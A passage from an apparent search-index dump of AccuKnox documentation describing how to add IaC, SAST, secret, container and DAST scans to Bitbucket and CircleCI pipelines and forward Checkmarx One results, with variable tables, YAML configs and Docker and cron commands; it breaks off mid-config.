file:</p> <pre><code>pipelines:\n  branches:\n    main:\n    - step:\n        name: AccuKnox IaC Scan\n        script:\n          - pipe: accu-knox/scan:2.0.0\n            variables:\n              SCAN_TYPE: IAC\n              DIRECTORY: \"./\"\n              SOFT_FAIL: \"true\"\n              ACCUKNOX_TOKEN: ${ACCUKNOX_TOKEN}\n              ACCUKNOX_TENANT: ${ACCUKNOX_TENANT}\n              ACCUKNOX_ENDPOINT: ${ACCUKNOX_ENDPOINT}\n              ACCUKNOX_LABEL: ${ACCUKNOX_LABEL}\n</code></pre>"},{"location":"integrations/bitbucket-iac-scan/#initial-cicd-pipeline-without-accuknox-iac-scan","title":"Initial CI/CD Pipeline Without AccuKnox IaC Scan","text":"<p>Initially, the CI/CD pipeline does not include the AccuKnox IaC scan. When changes are pushed to the repository, no infrastructure security checks are performed, potentially allowing misconfigurations or vulnerabilities in the IaC code.</p> <p>CI/CD Pipeline After AccuKnox IaC Scan Integration Once the AccuKnox IaC scan is integrated into the CI/CD pipeline, every push triggers an IaC security scan. This scan identifies potential security vulnerabilities or misconfigurations in the infrastructure code, enhancing security before deployment. The findings are then sent to the AccuKnox platform.</p> <p></p>"},{"location":"integrations/bitbucket-iac-scan/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>Step 1: After the pipeline completes, navigate to the Accuknox SaaS dashboard.</p> <p>Step 2: Go to Issues &gt; Findings and select IaC Findings to see identified vulnerabilities.</p> <p></p> <p>Step 3: Click on a vulnerability to view more details and follow the instructions in the Solutions tab.</p> <p></p> <p>Step 4: For unresolved vulnerabilities, create a ticket in your issue tracking system.</p> <p></p> <p>Step 5: After fixing the vulnerabilities, rerun the CI/CD pipeline and verify that the issues have been resolved in the AccuKnox dashboard.</p>"},{"location":"integrations/bitbucket-iac-scan/#conclusion","title":"Conclusion","text":"<p>Integrating IaC scanning with AccuKnox in a Bitbucket pipeline strengthens infrastructure security. By detecting vulnerabilities early, this integration ensures a secure and reliable deployment environment.</p>"},{"location":"integrations/bitbucket-iac-variables/","title":"Bitbucket Infrastructure as Code (IaC) Scanning Variables","text":"<p>The Infrastructure as Code (IaC) scanning section of the Bitbucket CI/CD pipeline is designed to integrate with AccuKnox to scan infrastructure code files (e.g., Terraform) for security vulnerabilities.</p> <p>Here\u2019s the table that outlines the inputs and their descriptions, along with default values:</p> Input Value Description Default Value INPUT_FILE Specify a file for scanning (e.g., \".tf\" for Terraform). Cannot be used with directory input. \"\" (empty, optional) INPUT_DIRECTORY Directory with infrastructure code and/or package manager files to scan. \".\" (current directory) INPUT_COMPACT Do not display code blocks in the output. true (boolean) INPUT_QUIET Display only failed checks. true (boolean) INPUT_SOFT_FAIL Do not return an error code if there are failed checks. true (boolean) INPUT_FRAMEWORK Run only on a specific infrastructure (Kubernetes or Terraform). \"\" (empty, optional) ACCUKNOX_TOKEN The token for authenticating with the CSPM panel. N/A (Required) ACCUKNOX_TENANT ID of the tenant associated with the CSPM panel. N/A (Required) ACCUKNOX_ENDPOINT URL of the CSPM panel to push the scan results to. cspm.demo.accuknox.com ACCUKNOX_LABEL Label created in AccuKnox SaaS for associating scan results. N/A (Required)"},{"location":"integrations/bitbucket-overview/","title":"Bitbucket Integrations","text":""},{"location":"integrations/bitbucket-overview/#bitbucket-integrations","title":"Bitbucket Integrations","text":"<p>SAST</p> <p>SAST (SonarQube)</p> <p>Container Scan</p> <p>IaC Scan</p> <p>DAST (Dynamic Analysis)</p> <p>Secrets Scan</p>"},{"location":"integrations/bitbucket-overview/#scan-variables","title":"Scan Variables","text":"<p>Container Variables</p> <p>IaC Variables</p> <p>DAST (Dynamic Analysis)</p> <p>SAST Variables</p> <p></p>"},{"location":"integrations/bitbucket-sast-variables/","title":"Bitbucket Static Application Security Testing (SAST) Scanning Variables","text":"<p>The Static Application Security Testing (SAST) scanning section of the Bitbucket CI/CD pipeline integrates with SonarQube for analyzing code quality and security vulnerabilities. The scan results are then pushed to the AccuKnox platform for further analysis and tracking.</p> <p>Here\u2019s the table that outlines the inputs and their descriptions, along with default values:</p> Input Description Default Value SONAR_TOKEN Token for authenticating with SonarQube. N/A (Required) SONAR_HOST_URL The SonarQube host URL. N/A (Required) SONAR_PROJECT_KEY The project key in SonarQube. N/A (Required) ACCUKNOX_TOKEN Token for authenticating with the CSPM panel. N/A (Required) ACCUKNOX_TENANT The ID of the tenant associated with the CSPM panel. N/A (Required) ACCUKNOX_ENDPOINT The URL of the CSPM panel to push the scan results to. cspm.demo.accuknox.com ACCUKNOX_LABEL Label created in AccuKnox SaaS for associating scan results. N/A (Required)"},{"location":"integrations/bitbucket-sast/","title":"Integrating SAST in BitBucket CI/CD Pipeline","text":"<p>This guide explains how to integrate AccuKnox into your Bitbucket Pipelines to enhance code security using SonarQube for SAST scanning. It identifies potential vulnerabilities and sends the results to AccuKnox for further analysis and remediation.</p>"},{"location":"integrations/bitbucket-sast/#pre-requisites","title":"Pre-requisites","text":"<ul> <li> <p>Access to Bitbucket Pipelines</p> </li> <li> <p>AccuKnox Platform Access</p> </li> <li> <p>SonarQube Access</p> </li> </ul>"},{"location":"integrations/bitbucket-sast/#steps-for-integration","title":"Steps for Integration","text":"<p>Step 1: Log in to AccuKnox Navigate to Settings and select Tokens to create an AccuKnox token for forwarding scan results to SaaS. For details on generating tokens, refer to How to Create Tokens.</p> <p>Step 2: Add the following variables in your Bitbucket repository settings:. For details on configuring variables, refer to How to Create CI/CD Variables in Bitbucket.</p> <ol> <li> <p>ACCUKNOX_TOKEN: AccuKnox API token for authorization.</p> </li> <li> <p>ACCUKNOX_TENANT: Your AccuKnox tenant ID.</p> </li> <li> <p>ACCUKNOX_ENDPOINT: The AccuKnox API URL (e.g., cspm.demo.accuknox.com).</p> </li> <li> <p>ACCUKNOX_LABEL: The label for your scan.</p> </li> <li> <p>SONAR_TOKEN: Your SonarQube API token.</p> </li> <li> <p>SONAR_HOST_URL: The URL of your SonarQube server.</p> </li> <li> <p>SONAR_PROJECT_KEY: The project key for your SonarQube project.</p> </li> </ol> <p>Step 3: Configure Bitbucket Pipeline</p> Input Description Default Value <code>SONAR_TOKEN</code> Token for authenticating with SonarQube. N/A (Required) <code>SONAR_HOST_URL</code> The SonarQube host URL. N/A (Required) <code>SONAR_PROJECT_KEY</code> The project key in SonarQube. N/A (Required) <code>SONAR_ORGANIZATION_ID</code> Required only for SonarQube Cloud users. <code>\"\"</code> <code>SKIP_SONAR_SCAN</code> Skip SonarQube scan, for advanced users. Value should be boolean. <code>false</code> (boolean) <code>SOFT_FAIL</code> Do not return an error code if there are failed checks. <code>true</code> (boolean) <code>ACCUKNOX_TENANT</code> The ID of the tenant associated with the CSPM panel. N/A (Required) <code>ACCUKNOX_ENDPOINT</code> The URL of the CSPM panel to push the scan results to. N/A (Required) <code>ACCUKNOX_LABEL</code> The label created in AccuKnox SaaS for associating scan results. N/A (Required) <code>ACCUKNOX_TOKEN</code> The token for authenticating with the CSPM panel. N/A (Required) <p>Use the following YAML configuration for your <code>bitbucket-pipelines.yml</code> file:</p> <pre><code>definitions:\n  services:\n    docker:\n      memory: 3072\n\npipelines:\n  branches:\n    main:\n    - step:\n        name: AccuKnox SAST Scan\n        script:\n          - pipe: accu-knox/scan:2.0.0\n            variables:\n              SCAN_TYPE: SQ_SAST\n              SKIP_SONAR_SCAN: \"false\"\n              SONAR_TOKEN: ${SONAR_TOKEN}\n              SONAR_HOST_URL: ${SONAR_HOST_URL}\n              SONAR_PROJECT_KEY: ${SONAR_PROJECT_KEY}\n              ACCUKNOX_TOKEN: ${ACCUKNOX_TOKEN}\n              ACCUKNOX_TENANT: ${ACCUKNOX_TENANT}\n              ACCUKNOX_ENDPOINT: ${ACCUKNOX_ENDPOINT}\n              ACCUKNOX_LABEL: ${ACCUKNOX_LABEL}\n</code></pre>"},{"location":"integrations/bitbucket-sast/#initial-cicd-pipeline-without-accuknox-scan","title":"Initial CI/CD Pipeline Without AccuKnox Scan","text":"<p>Initially, the CI/CD pipeline does not include the AccuKnox scan. Vulnerabilities in the code could go unnoticed without security checks.</p>"},{"location":"integrations/bitbucket-sast/#cicd-pipeline-after-accuknox-integration","title":"CI/CD Pipeline After AccuKnox Integration","text":"<p>After integrating AccuKnox into the pipeline, pushing changes triggers the SonarQube scan, which sends its results to AccuKnox. AccuKnox helps identify potential code vulnerabilities.</p> <p></p> <p></p>"},{"location":"integrations/bitbucket-sast/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>Step 1: After the workflow completes, navigate to the AccuKnox SaaS dashboard.</p> <p>Step 2: Go to Issues &gt; Findings and select SAST Findings to see identified vulnerabilities.</p> <p></p> <p>Step 3: Click on a vulnerability to view more details.</p> <p></p> <p>Step 4: Fix the Vulnerability</p> <p>Follow the instructions in the Solutions tab to fix the vulnerability</p> <p></p> <p>Step 5: Create a Ticket for Fixing the Vulnerability</p> <p>Create a ticket in your issue-tracking system to address the identified vulnerability.</p> <p></p> <p>Step 6: Review Updated Results</p> <ul> <li> <p>After fixing the vulnerability, rerun the CI/CD pipeline.</p> </li> <li> <p>Navigate to the AccuKnox SaaS dashboard and verify that the vulnerability has been resolved.</p> </li> </ul>"},{"location":"integrations/bitbucket-sast/#conclusion","title":"Conclusion","text":"<p>Integrating SonarQube with AccuKnox in Bitbucket Pipelines helps detect and remediate vulnerabilities early in the development lifecycle, ensuring a secure deployment environment.</p>"},{"location":"integrations/bitbucket-secret-scan/","title":"Bitbucket Secret Scan","text":"<p>This guide explains integrating AccuKnox Secret Scanning into your Bitbucket CI/CD Pipeline. The integration enhances code security by detecting hard-coded secrets and sensitive information in your repositories. It then uploads the results to the AccuKnox SaaS platform for further analysis and remediation.</p>"},{"location":"integrations/bitbucket-secret-scan/#pre-requisites","title":"Pre-requisites","text":"<p>To integrate AccuKnox Secret Scanning, ensure you have:</p> <ul> <li> <p>Access to Bitbucket Pipelines.</p> </li> <li> <p>An active AccuKnox Platform account.</p> </li> </ul>"},{"location":"integrations/bitbucket-secret-scan/#steps-for-integration","title":"Steps for Integration","text":""},{"location":"integrations/bitbucket-secret-scan/#step-1-log-in-to-accuknox","title":"Step 1: Log in to AccuKnox","text":"<ol> <li> <p>Log in to the AccuKnox SaaS platform.</p> </li> <li> <p>Navigate to Settings &gt; Tokens and generate a token to enable scan result uploads. For details on generating tokens, refer to How to Create Tokens.</p> </li> </ol>"},{"location":"integrations/bitbucket-secret-scan/#step-2-configure-cicd-variables","title":"Step 2: Configure CI/CD Variables","text":"<ol> <li> <p>Go to your Bitbucket repository settings.</p> </li> <li> <p>Add the following variables, for details on configuring variables, refer to How to Create CI/CD Variables in Bitbucket.</p> <ul> <li> <p>ACCUKNOX_TOKEN: Your AccuKnox API token.</p> </li> <li> <p>ACCUKNOX_TENANT: Your AccuKnox tenant ID.</p> </li> <li> <p>ACCUKNOX_ENDPOINT: Your AccuKnox API endpoint.</p> </li> <li> <p>ACCUKNOX_LABEL: Label for scan results.</p> </li> </ul> </li> </ol>"},{"location":"integrations/bitbucket-secret-scan/#step-3-update-the-bitbucket-pipelinesyml-file","title":"Step 3: Update the <code>bitbucket-pipelines.yml</code> File","text":"Input Value Description Default Value <code>RESULTS</code> Specifies which type(s) of results to output: <code>verified</code>, <code>unknown</code>, <code>unverified</code>, <code>filtered_unverified</code>. Defaults to all types. <code>\"\"</code> <code>BRANCH</code> The branch to scan. Use <code>all-branches</code> to scan all branches. <code>\"\"</code> <code>EXCLUDE_PATHS</code> Paths to exclude from the scan. <code>\"\"</code> <code>ADDITIONAL_ARGUMENTS</code> Extra parameters for secret scanning. <code>\"\"</code> <code>SOFT_FAIL</code> Do not return an error code if secrets are found. <code>true</code> <code>ACCUKNOX_TOKEN</code> The token for authenticating with the CSPM panel. N/A (Required) <code>ACCUKNOX_TENANT</code> The ID of the tenant associated with the CSPM panel. N/A (Required) <code>ACCUKNOX_ENDPOINT</code> The URL of the CSPM panel to push the scan results to. N/A (Required) <code>ACCUKNOX_LABEL</code> The label created in AccuKnox SaaS for associating scan results. N/A (Required) <p>Add the following secret scanning configuration to your pipeline:</p> <pre><code>pipelines:\n  branches:\n    main:\n    - step:\n        name: AccuKnox Secret Scan\n        script:\n          - pipe: accu-knox/scan:2.0.0\n            variables:\n              SCAN_TYPE: SECRET\n              SOFT_FAIL: \"true\"\n              ACCUKNOX_TOKEN: ${ACCUKNOX_TOKEN}\n              ACCUKNOX_TENANT: ${ACCUKNOX_TENANT}\n              ACCUKNOX_ENDPOINT: ${ACCUKNOX_ENDPOINT}\n              ACCUKNOX_LABEL: ${ACCUKNOX_LABEL}\n</code></pre>"},{"location":"integrations/bitbucket-secret-scan/#step-4-commit-and-push-changes","title":"Step 4: Commit and Push Changes","text":"<ul> <li> <p>Commit the updated <code>bitbucket-pipelines.yml</code> file to your repository.</p> </li> <li> <p>Push the changes to trigger the pipeline.</p> </li> </ul>"},{"location":"integrations/bitbucket-secret-scan/#initial-cicd-pipeline-without-accuknox-secret-scan","title":"Initial CI/CD Pipeline Without AccuKnox Secret Scan","text":"<p>Before integrating AccuKnox Secret Scanning, your pipeline might lack any security checks for detecting hardcoded secrets, potentially exposing sensitive information.</p>"},{"location":"integrations/bitbucket-secret-scan/#cicd-pipeline-after-accuknox-secret-scan-integration","title":"CI/CD Pipeline After AccuKnox Secret Scan Integration","text":"<p>Once the AccuKnox Secret Scanning is integrated into the CI/CD pipeline, every push triggers a secret scan. This scan detects hardcoded secrets and sensitive information in the code, ensuring immediate identification and remediation. The findings are then sent to the AccuKnox platform. Only the findings details are sent to the AccuKnox platform, not the secrets themselves.</p> <p></p>"},{"location":"integrations/bitbucket-secret-scan/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":""},{"location":"integrations/bitbucket-secret-scan/#step-1-navigate-to-the-dashboard","title":"Step 1: Navigate to the Dashboard","text":"<p>Go to Issues &gt; Findings and select Secret Scan Findings.</p> <p></p>"},{"location":"integrations/bitbucket-secret-scan/#step-2-review-detected-secrets","title":"Step 2: Review Detected Secrets","text":"<p>Examine the list of identified hardcoded secrets an d sensitive information.</p> <p></p>"},{"location":"integrations/bitbucket-secret-scan/#step-3-resolve-findings","title":"Step 3: Resolve Findings","text":"<p>Create a ticket in your issue-tracking system for each finding, recommending rotating the exposed secret and using a secure secret management solution for handling secrets. Once the issue is resolved, mark it as fixed in the AccuKnox platform.</p> <p></p>"},{"location":"integrations/bitbucket-secret-scan/#conclusion","title":"Conclusion","text":"<p>Integrating AccuKnox Secret Scanning into your Bitbucket pipeline provides an essential layer of security, identifying and mitigating risks early in the development lifecycle. This proactive approach ensures that sensitive information is safeguarded, contributing to a more secure codebase.</p>"},{"location":"integrations/checkmarx/","title":"Checkmarx (SAST, SCA, KICS, Container Scan) Integration with AccuKnox","text":"<p>This integration fetches SAST, SCA, KICS, and Container scan results from Checkmarx One and sends them to AccuKnox to visualize and prioritize vulnerabilities across projects.</p>"},{"location":"integrations/checkmarx/#prerequisites","title":"Prerequisites","text":"<ul> <li>Docker installed</li> <li><code>.env</code> file created with the necessary variables (see below)</li> </ul>"},{"location":"integrations/checkmarx/#environment-variables","title":"Environment Variables","text":"<p>Below are the required variables to configure the integration:</p>"},{"location":"integrations/checkmarx/#checkmarx-variables","title":"Checkmarx Variables","text":"Variable Description <code>CX_API_KEY</code> API token to authenticate with Checkmarx One Generate API Key <code>CX_PROJECT</code> Project filter (supports wildcards and exclusion) <code>CX_PRIMARY_BRANCH</code> <code>true</code> to consider only the primary branch of projects"},{"location":"integrations/checkmarx/#cx_project-usage-guide","title":"<code>CX_PROJECT</code> Usage Guide:","text":"<ul> <li><code>{\"*\":\"*\"}</code> \u2192 All projects, all branches</li> <li><code>{\"*dvwa*\":\"*\"}</code> \u2192 Only projects with dvwa in the name, all branches</li> <li><code>{\"*dvwa*\":\"main\"}</code> \u2192 Only projects with dvwa in the name and branch = <code>main</code></li> <li><code>{-*dvwa*:\"main\"}</code> \u2192 Exclude projects with dvwa in the name; only include <code>main</code> branch from others</li> </ul>"},{"location":"integrations/checkmarx/#accuknox-variables","title":"AccuKnox Variables","text":"Variable Description <code>AK_ENDPOINT</code> AccuKnox API endpoint (e.g., <code>https://cspm.demo.accuknox.com</code>) <code>AK_LABEL</code> Label to tag the findings in AccuKnox UI Create Labels <code>AK_TENANT_ID</code> Tenant ID in AccuKnox platform Get Tenant ID <code>AK_TOKEN</code> API token to authenticate with AccuKnox Generate Token"},{"location":"integrations/checkmarx/#sample-env-file","title":"Sample <code>.env</code> file","text":"<pre><code>CX_API_KEY=eyJhbGciOiJIUzUxMiIsInR5..................\nCX_PROJECT={\"*\":\"*\"}\nCX_PRIMARY_BRANCH=false\nAK_ENDPOINT=https://cspm.demo.accuknox.com\nAK_LABEL=cxprime\nAK_TENANT_ID=123\nAK_TOKEN=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ0b2tl...............\n</code></pre>"},{"location":"integrations/checkmarx/#run-the-integration","title":"Run the Integration","text":"<pre><code>docker run --rm -it \\\n  --env-file .env \\\n  -v $PWD:/app/data/ \\\n  accuknox/checkmarx-one-job:1.4\n</code></pre> <p>The script fetches results from Checkmarx One using the API key and project filter, then forwards them to AccuKnox for visualization and risk prioritization.</p>"},{"location":"integrations/checkmarx/#schedule-the-scan-with-cron-optional","title":"Schedule the Scan with Cron (Optional)","text":"<p>To automate the Checkmarx and AccuKnox integration (e.g., every 30 minutes or daily), you can schedule it using a cron job on your system.</p>"},{"location":"integrations/checkmarx/#1-create-a-shell-script","title":"1. Create a Shell Script","text":"<p>Save the following script as <code>run_checkmarx.sh</code> in your project directory:</p> <pre><code>#!/bin/bash\n\ncd /path/to/your/project\n\ndocker run --rm \\\n  --env-file .env \\\n  -v $(pwd):/app/data/ \\\n  accuknox/checkmarx-one-job:1.4\n</code></pre> <p>Replace <code>/path/to/your/project</code> with the absolute path to your working directory where the <code>.env</code> file is located.</p> <p>Make the script executable:</p> <pre><code>chmod +x run_checkmarx.sh\n</code></pre>"},{"location":"integrations/checkmarx/#2-add-a-cron-job","title":"2. Add a Cron Job","text":"<p>To run the scan automatically every 5 minutes:</p> <p>Open your crontab:</p> <pre><code>crontab -e\n</code></pre> <p>Add this line to the bottom:</p> <pre><code>*/5 * * * * /path/to/your/project/run_checkmarx.sh &gt;&gt; /path/to/your/project/checkmarx_cron.log 2&gt;&amp;1\n</code></pre> <p>This schedules the scan every 5 minutes and logs the output to a file named <code>checkmarx_cron.log</code>.</p> <p>You can change the schedule as needed. Examples:</p> <ul> <li>Every 5 minutes: <code>*/5 * * * *</code></li> <li>Daily at 2 AM: <code>0 2 * * *</code></li> <li>Weekly on Sunday at midnight: <code>0 0 * * 0</code></li> </ul>"},{"location":"integrations/checkmarx/#3-monitor-the-output","title":"3. Monitor the Output","text":"<p>To monitor the output of scheduled scans, check the log file:</p> <pre><code>tail -f /path/to/your/project/checkmarx_cron.log\n</code></pre>"},{"location":"integrations/checkmarx/#tips","title":"Tips","text":"<ul> <li>Always use absolute paths in cron jobs (cron does not know your working directory).</li> <li>Ensure Docker can be run without <code>sudo</code> (or update the script accordingly).</li> <li>Make sure the <code>.env</code> file is valid and in the correct location.</li> </ul>"},{"location":"integrations/checkmarx/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>To view the Checkmarx findings:</p> <ol> <li>Navigate to the AccuKnox Console.</li> <li>Go to Issues &gt; Findings.</li> <li>Select one of the following categories to view the identified vulnerabilities:<ul> <li>CX SAST</li> <li>CX SCA</li> <li>CX KICS</li> <li>CX Containers</li> </ul> </li> </ol> <p></p>"},{"location":"integrations/checkmarx/#notes","title":"Notes","text":"<ul> <li>Make sure your <code>.env</code> file does not contain trailing spaces or special characters that could break parsing.</li> <li>The <code>AK_LABEL</code> helps categorize data inside the AccuKnox dashboard (e.g., <code>cxprime</code>, <code>checkmarx-scan</code>). Learn More</li> <li>To schedule this job, you can embed this in a CI/CD pipeline or cron job runner.</li> </ul>"},{"location":"integrations/cicd-overview/","title":"CI/CD Integrations Overview","text":""},{"location":"integrations/cicd-overview/#cicd-integrations-overview","title":"CI/CD Integrations Overview","text":"<p>CI/CD Support Matrix provides a structured overview of supported capabilities and integration types across popular CI/CD platforms. This helps teams align their DevOps processes with available tools and identify the best fit for their workflows.</p> <p>Our approach to CI/CD pipeline integration is not just about connecting tools\u2014it's about creating a unified, automated security fabric that protects your applications from code to cloud. We focus on three core pillars: proactive vulnerability prevention, real-time threat detection, and continuous supply chain hardening. By shifting security left, we ensure every stage of your development lifecycle is fortified against modern attacks.</p> <p></p> Continuous API SecurityIntegrated SAST &amp; Secrets ScanningCI/CD Pipeline Hardening <p>\ud83d\ude80 Instead of relying on infrequent manual penetration tests, our solution integrates DAST into your CI/CD pipeline.</p> <ul> <li>Continuous, automated endpoint testing</li> <li>Real-time alerts for new flaws</li> <li>Prevents risks from frequent updates</li> </ul> <p>\ud83d\udd12 Enable dev teams to scan code and configs inline with PRs.</p> <ul> <li>Static Application Security Testing (SAST)</li> <li>Secrets &amp; sensitive data detection</li> <li>Blocks merges until baseline is met</li> </ul> <p>\ud83d\udee1\ufe0f Secure your software supply chain by validating executions.</p> <ul> <li>Monitors CI/CD for improper behavior</li> <li>Detects unauthorized execution paths</li> <li>Prevents hidden supply chain attacks</li> </ul> <p>Azure DevOps</p> <p>Google Cloud Build</p> <p>Harness</p> <p>Jenkins</p> <p>AWS Code Pipeline</p> <p>GitHub</p> <p>Gitlab</p> <p>Bitbucket</p> <p>Checkmarx</p> <p>CircleCI</p>"},{"location":"integrations/circleci-container-scan/","title":"Container Scanning Integration using AccuKnox CircleCI Plugin","text":"<p>AccuKnox\u2019s Container Scanning capability allows you to detect vulnerabilities in your Docker images directly within your CI/CD pipeline. Integrating this with CircleCI helps ensure that insecure containers are flagged and addressed before deployment, significantly enhancing the security posture of your workloads.</p>"},{"location":"integrations/circleci-container-scan/#prerequisites","title":"Prerequisites","text":"<p>Before integrating container scanning, ensure you have:</p> <ul> <li>A CircleCI project connected to your codebase and container build workflow.</li> <li>Admin access to manage CircleCI Contexts or Project-level Environment Variables.</li> <li>Access to the AccuKnox Console.</li> </ul>"},{"location":"integrations/circleci-container-scan/#step-1-log-in-to-accuknox-and-generate-api-token","title":"Step 1: Log in to AccuKnox and Generate API Token","text":"<p>To begin, you'll need an API token from AccuKnox:</p> <ol> <li>Log into your AccuKnox Console.</li> <li>Navigate to Settings \u2192 Tokens.</li> <li>Create a new token to securely send scan results from CircleCI to AccuKnox. For detailed instructions, refer to the \"How to Create Tokens\" documentation.</li> </ol> <p></p>"},{"location":"integrations/circleci-container-scan/#step-2-set-environment-variables-in-circleci","title":"Step 2: Set Environment Variables in CircleCI","text":"<p>You have two options for configuring environment variables in CircleCI:</p>"},{"location":"integrations/circleci-container-scan/#option-a-use-circleci-contexts-recommended","title":"Option A: Use CircleCI Contexts (Recommended)","text":"<p>Using contexts is the recommended approach for managing environment variables across multiple jobs.</p> <ol> <li>Go to CircleCI \u2192 Organization Settings \u2192 Contexts.</li> <li>Create a new context (e.g., <code>accuknox-context</code>).</li> <li>Add the following environment variables to the new context:</li> </ol> Name Description <code>ACCUKNOX_TOKEN</code> API token from AccuKnox <code>ACCUKNOX_ENDPOINT</code> AccuKnox API endpoint (e.g., <code>https://cspm.demo.accuknox.com</code>) <code>ACCUKNOX_TENANT</code> Your tenant ID from AccuKnox <code>ACCUKNOX_LABEL</code> Logical grouping label for scan results <p>Attach this context to your scan jobs within your <code>.circleci/config.yml</code> file, like so:     <pre><code>- accuknox-scan/container:\n    context: accuknox-context\n    IMAGE_NAME: circleci\n    IMAGE_TAR: image.tar\n    TAG: test\n    SOFT_FAIL: true\n</code></pre></p>"},{"location":"integrations/circleci-container-scan/#option-b-use-project-level-environment-variables","title":"Option B: Use Project-Level Environment Variables","text":"<p>If contexts aren't suitable for your setup, you can use project-level environment variables:</p> <ol> <li>Navigate to CircleCI \u2192 Project Settings \u2192 Environment Variables.</li> <li>Add the same four variables manually as described in Option A.</li> </ol> <p></p>"},{"location":"integrations/circleci-container-scan/#step-3-add-the-container-scan-job-to-your-pipeline","title":"Step 3: Add the Container Scan Job to Your Pipeline","text":"<p>Update your CircleCI configuration file (<code>.circleci/config.yml</code>) to include the container scan job provided by the AccuKnox plugin:</p> <pre><code>version: 2.1\n\norbs:\n  accuknox-scan: accuknox/scan@1.0.2\n\njobs:\n  build-docker-image:\n    docker:\n      - image: cimg/base:stable\n    steps:\n      - checkout\n      - setup_remote_docker\n      - run:\n          name: Build Docker Image\n          command: \n            docker build -t circleci:test -f Dockerfile .\n            docker save circleci:test -o image.tar\n      - persist_to_workspace:\n          root: .\n          paths:\n          - image.tar\n\nworkflows:  \n  accuknox:\n    jobs:\n    - build-docker-image\n    - accuknox-scan/container:\n        requires:\n        - build-docker-image\n        IMAGE_NAME: circleci\n        IMAGE_TAR: image.tar\n        TAG: test\n        SOFT_FAIL: true\n        SEVERITY: \"UNKNOWN,LOW,MEDIUM,HIGH,CRITICAL\"\n</code></pre>"},{"location":"integrations/circleci-container-scan/#explanation-of-parameters","title":"Explanation of Parameters","text":"<p>The <code>accuknox-scan/container</code> job accepts several parameters to define the image to scan and its behavior:</p> Parameter Description Default Value <code>IMAGE_NAME</code> Name of the Docker image to scan. Required <code>IMAGE_TAR</code> Path/filename of the Docker image tarball Required <code>TAG</code> Tag/version of the image. Required <code>SEVERITY</code> Comma-separated list of severities: <code>UNKNOWN</code>, <code>LOW</code>, <code>MEDIUM</code>, <code>HIGH</code>, <code>CRITICAL</code>. <code>UNKNOWN,LOW,MEDIUM,HIGH,CRITICAL</code> <code>SOFT_FAIL</code> If <code>true</code>, the job will not fail even if issues are found. <code>true</code>"},{"location":"integrations/circleci-container-scan/#step-4-view-scan-results-in-accuknox-console","title":"Step 4: View Scan Results in AccuKnox Console","text":"<p>After the pipeline runs, the scan results are sent to AccuKnox:</p> <ol> <li>Log in to the AccuKnox Console.</li> <li> <p>Navigate to Issues \u2192 Findings \u2192 Container Findings.     </p> </li> <li> <p>Click on individual findings to view details such as:     _ Vulnerability name and description     _ CVE details     _ Affected packages     _ Severity and remediation guidance </p> </li> </ol>"},{"location":"integrations/circleci-container-scan/#step-5-fix-and-verify","title":"Step 5: Fix and Verify","text":"<p>Once vulnerabilities are fixed:</p> <ol> <li>Rebuild and tag the Docker image.</li> <li>Push updated code/image to trigger the CircleCI pipeline.</li> <li>The CircleCI pipeline will rerun the container scan.</li> <li>Verify that no critical issues are reported in the AccuKnox Console.</li> </ol>"},{"location":"integrations/circleci-container-scan/#conclusion","title":"Conclusion","text":"<p>By integrating container scanning into your CircleCI pipeline with AccuKnox, your team can continuously validate the security of your images and maintain compliance with best practices. This ensures your container deployments are hardened before they reach production.</p> <p>For more help, contact <code>support@accuknox.com</code> or refer to the AccuKnox Developer Documentation.</p> <p>Note</p> <p>Since the AccuKnox CircleCI plugin is currently unverified, you must enable the usage of unverified orbs in your CircleCI project settings. Navigate to Organization Settings \u2192 Security and toggle \"Allow uncertified public orbs\" to <code>true</code>. </p>"},{"location":"integrations/circleci-dast/","title":"DAST Scanning Integration using AccuKnox CircleCI Plugin","text":"<p>To demonstrate the benefits of incorporating AccuKnox into a CI/CD pipeline using CircleCI, this guide explains how to integrate Dynamic Application Security Testing (DAST) scans into your build process. By using the AccuKnox CircleCI plugin, teams can identify and resolve application-layer vulnerabilities before pushing to production.</p> <p></p>"},{"location":"integrations/circleci-dast/#prerequisites","title":"Prerequisites","text":"<ul> <li>A configured CircleCI project connected to your application\u2019s source repository.</li> <li>Admin access to create CircleCI Contexts or add Project-level Environment Variables.</li> <li>Access to the AccuKnox platform.</li> </ul>"},{"location":"integrations/circleci-dast/#steps-for-integration","title":"Steps for Integration","text":""},{"location":"integrations/circleci-dast/#step-1-log-in-to-accuknox-and-generate-api-token","title":"Step 1: Log in to AccuKnox and Generate API Token","text":"<ol> <li>Log into your AccuKnox Console</li> <li>Navigate to Settings \u2192 Tokens.</li> <li>Create a new token to be used for sending scan results securely from CircleCI to AccuKnox. For detailed steps, refer to How to Create Tokens.</li> </ol>"},{"location":"integrations/circleci-dast/#step-2-set-environment-variables-in-circleci","title":"Step 2: Set Environment Variables in CircleCI","text":"<p>You can configure environment variables in two ways:</p>"},{"location":"integrations/circleci-dast/#option-a-use-circleci-contexts-recommended","title":"Option A: Use CircleCI Contexts (Recommended)","text":"<ol> <li>Go to CircleCI &gt; Organization Settings &gt; Contexts.</li> <li>Create a new context (e.g., <code>accuknox-context</code>).</li> <li>Add the following environment variables to the context:</li> </ol> Name Description <code>ACCUKNOX_TOKEN</code> API token from AccuKnox <code>ACCUKNOX_ENDPOINT</code> AccuKnox API endpoint (e.g., https://cspm.demo.accuknox.com) <code>ACCUKNOX_TENANT</code> Your tenant ID from AccuKnox <code>ACCUKNOX_LABEL</code> Logical grouping label for scan results <p>Then, attach this context to your scan jobs as shown in the configuration below.</p> <pre><code>- accuknox-scan/dast:\n    context: dast-context\n    SOFT_FAIL: true\n    TARGET_URL: \"[http://testphp.vulnweb.com](http://testphp.vulnweb.com)\"\n</code></pre>"},{"location":"integrations/circleci-dast/#option-b-project-level-variables","title":"Option B: Project-Level Variables","text":"<ol> <li>Navigate to your CircleCI Project Settings \u2192 Environment Variables.</li> <li>Add the same four environment variables manually.</li> </ol>"},{"location":"integrations/circleci-dast/#step-3-add-the-dast-job-to-circleci-configuration","title":"Step 3: Add the DAST Job to CircleCI Configuration","text":"<p>To integrate DAST scanning, modify your <code>.circleci/config.yml</code> file using the AccuKnox CircleCI Orb.</p> <pre><code>version: 2.1\n\norbs:\n  accuknox-scan: accuknox/scan@1.0.0\n\nworkflows:\n  accuknox:\n    